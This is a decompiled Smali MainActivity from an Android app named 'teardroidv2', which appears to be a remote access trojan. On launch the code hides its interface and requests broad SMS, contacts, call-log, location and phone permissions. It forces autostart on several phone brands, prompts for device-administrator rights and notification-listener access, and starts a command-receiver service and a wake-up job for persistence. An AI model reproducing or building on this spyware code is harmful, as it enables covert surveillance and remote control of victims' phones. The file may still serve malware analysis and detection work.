.class public final Lcom/example/teardroidv2/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.kt"


# annotations
.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u00002\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0002\n\u0002\u0010\u0002\n\u0002\u0008\u0003\n\u0002\u0010\u000b\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0011\n\u0002\u0010\u000e\n\u0002\u0008\u0003\n\u0002\u0018\u0002\n\u0000\u0018\u00002\u00020\u0001B\u0005\u00a2\u0006\u0002\u0010\u0002J\u0008\u0010\u0003\u001a\u00020\u0004H\u0003J\u0008\u0010\u0005\u001a\u00020\u0004H\u0002J\u0008\u0010\u0006\u001a\u00020\u0004H\u0002J/\u0010\u0007\u001a\u00020\u00082\u0008\u0010\t\u001a\u0004\u0018\u00010\n2\u0016\u0010\u000b\u001a\u000c\u0012\u0008\u0008\u0001\u0012\u0004\u0018\u00010\r0\u000c\"\u0004\u0018\u00010\rH\u0002\u00a2\u0006\u0002\u0010\u000eJ\u0012\u0010\u000f\u001a\u00020\u00042\u0008\u0010\u0010\u001a\u0004\u0018\u00010\u0011H\u0015\u00a8\u0006\u0012"
    }
    d2 = {
        "Lcom/example/teardroidv2/MainActivity;",
        "Landroidx/appcompat/app/AppCompatActivity;",
        "()V",
        "addAutoStartup",
        "",
        "checkPermission",
        "getDeviceAdminPermission",
        "hasPermissions",
        "",
        "context",
        "Landroid/content/Context;",
        "permissions",
        "",
        "",
        "(Landroid/content/Context;[Ljava/lang/String;)Z",
        "onCreate",
        "savedInstanceState",
        "Landroid/os/Bundle;",
        "app_release"
    }
    k = 0x1
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 22
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method private final addAutoStartup()V
    .locals 4

    .line 97
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 98
    sget-object v1, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    const-string v2, "xiaomi"

    const/4 v3, 0x1

    .line 100
    invoke-static {v2, v1, v3}, Lkotlin/text/StringsKt;->equals(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 101
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.miui.securitycenter"

    const-string v3, "com.miui.permcenter.autostart.AutoStartManagementActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto :goto_0

    :cond_0
    const-string v2, "oppo"

    .line 106
    invoke-static {v2, v1, v3}, Lkotlin/text/StringsKt;->equals(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 107
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.coloros.safecenter"

    const-string v3, "com.coloros.safecenter.permission.startup.StartupAppListActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto :goto_0

    :cond_1
    const-string v2, "vivo"

    .line 112
    invoke-static {v2, v1, v3}, Lkotlin/text/StringsKt;->equals(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 113
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.vivo.permissionmanager"

    const-string v3, "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto :goto_0

    :cond_2
    const-string v2, "Letv"

    .line 118
    invoke-static {v2, v1, v3}, Lkotlin/text/StringsKt;->equals(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 119
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.letv.android.letvsafe"

    const-string v3, "com.letv.android.letvsafe.AutobootManageActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    goto :goto_0

    :cond_3
    const-string v2, "Honor"

    .line 124
    invoke-static {v2, v1, v3}, Lkotlin/text/StringsKt;->equals(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_4

    .line 125
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.huawei.systemmanager"

    const-string v3, "com.huawei.systemmanager.optimize.process.ProtectActivity"

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;

    .line 132
    :cond_4
    :goto_0
    invoke-virtual {p0}, Lcom/example/teardroidv2/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    const/high16 v2, 0x10000

    invoke-virtual {v1, v0, v2}, Landroid/content/pm/PackageManager;->queryIntentActivities(Landroid/content/Intent;I)Ljava/util/List;

    move-result-object v1

    const-string v2, "packageManager.queryInte\u2026nager.MATCH_DEFAULT_ONLY)"

    invoke-static {v1, v2}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    .line 133
    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v1

    if-lez v1, :cond_5

    .line 134
    invoke-virtual {p0, v0}, Lcom/example/teardroidv2/MainActivity;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    .line 137
    sget-object v1, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v1}, Lcom/example/teardroidv2/AppInfo;->getTAG()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :cond_5
    :goto_1
    return-void
.end method

.method private final checkPermission()V
    .locals 13

    const-string v0, "android.permission.INTERNET"

    const-string v1, "android.permission.READ_CONTACTS"

    const-string v2, "android.permission.READ_SMS"

    const-string v3, "android.permission.QUERY_ALL_PACKAGES"

    const-string v4, "android.permission.READ_CALL_LOG"

    const-string v5, "android.permission.READ_EXTERNAL_STORAGE"

    const-string v6, "android.permission.SET_WALLPAPER"

    const-string v7, "android.permission.SEND_SMS"

    const-string v8, "android.permission.CALL_PHONE"

    const-string v9, "android.permission.ACCESS_FINE_LOCATION"

    const-string v10, "android.permission.ACCESS_COARSE_LOCATION"

    const-string v11, "android.permission.READ_PHONE_STATE"

    const-string v12, "android.permission.READ_PHONE_NUMBERS"

    .line 72
    filled-new-array/range {v0 .. v12}, [Ljava/lang/String;

    move-result-object v0

    .line 74
    move-object v1, p0

    check-cast v1, Landroid/content/Context;

    const/16 v2, 0xd

    invoke-static {v0, v2}, Ljava/util/Arrays;->copyOf([Ljava/lang/Object;I)[Ljava/lang/Object;

    move-result-object v2

    check-cast v2, [Ljava/lang/String;

    invoke-direct {p0, v1, v2}, Lcom/example/teardroidv2/MainActivity;->hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 75
    move-object v1, p0

    check-cast v1, Landroid/app/Activity;

    const/4 v2, 0x1

    invoke-static {v1, v0, v2}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    :cond_0
    return-void
.end method

.method private final getDeviceAdminPermission()V
    .locals 3

    .line 51
    new-instance v0, Landroid/content/ComponentName;

    move-object v1, p0

    check-cast v1, Landroid/content/Context;

    const-class v2, Lcom/example/teardroidv2/DevAdminReceiver;

    invoke-direct {v0, v1, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 52
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 53
    check-cast v0, Landroid/os/Parcelable;

    const-string v2, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {v1, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    const/4 v0, 0x0

    .line 54
    invoke-virtual {p0, v1, v0}, Lcom/example/teardroidv2/MainActivity;->startActivityForResult(Landroid/content/Intent;I)V

    return-void
.end method

.method private final varargs hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z
    .locals 4

    if-eqz p1, :cond_1

    .line 81
    array-length v0, p2

    const/4 v1, 0x0

    const/4 v2, 0x0

    :cond_0
    if-ge v2, v0, :cond_1

    aget-object v3, p2, v2

    add-int/lit8 v2, v2, 0x1

    .line 84
    invoke-static {v3}, Lkotlin/jvm/internal/Intrinsics;->checkNotNull(Ljava/lang/Object;)V

    .line 82
    invoke-static {p1, v3}, Landroidx/core/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v3

    if-eqz v3, :cond_0

    return v1

    :cond_1
    const/4 p1, 0x1

    return p1
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    .line 26
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x1

    .line 27
    invoke-virtual {p0, p1}, Lcom/example/teardroidv2/MainActivity;->requestWindowFeature(I)Z

    .line 28
    invoke-virtual {p0}, Lcom/example/teardroidv2/MainActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x400

    invoke-virtual {v0, v1, v1}, Landroid/view/Window;->setFlags(II)V

    .line 32
    invoke-virtual {p0}, Lcom/example/teardroidv2/MainActivity;->getSupportActionBar()Landroidx/appcompat/app/ActionBar;

    move-result-object v0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    invoke-virtual {v0}, Landroidx/appcompat/app/ActionBar;->hide()V

    :goto_0
    const v0, 0x7f0b001c

    .line 33
    invoke-virtual {p0, v0}, Lcom/example/teardroidv2/MainActivity;->setContentView(I)V

    .line 34
    invoke-direct {p0}, Lcom/example/teardroidv2/MainActivity;->checkPermission()V

    .line 35
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v0}, Lcom/example/teardroidv2/AppInfo;->isServiceRunning()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/example/teardroidv2/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 36
    sget-object v2, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v2}, Lcom/example/teardroidv2/AppInfo;->getFirstRunKey()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v2, p1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result p1

    if-eqz p1, :cond_1

    .line 37
    invoke-direct {p0}, Lcom/example/teardroidv2/MainActivity;->addAutoStartup()V

    .line 38
    invoke-direct {p0}, Lcom/example/teardroidv2/MainActivity;->getDeviceAdminPermission()V

    .line 39
    new-instance p1, Landroid/content/Intent;

    const-string v2, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

    invoke-direct {p1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, p1}, Lcom/example/teardroidv2/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 40
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    .line 41
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v0}, Lcom/example/teardroidv2/AppInfo;->getFirstRunKey()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 42
    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    :cond_1
    const-class p1, Lcom/example/teardroidv2/CommandReciver;

    .line 45
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/example/teardroidv2/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1, p1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 46
    invoke-virtual {p0, v0}, Lcom/example/teardroidv2/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 47
    new-instance p1, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/example/teardroidv2/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Lcom/example/teardroidv2/JobWakeUpService;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, p1}, Lcom/example/teardroidv2/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method
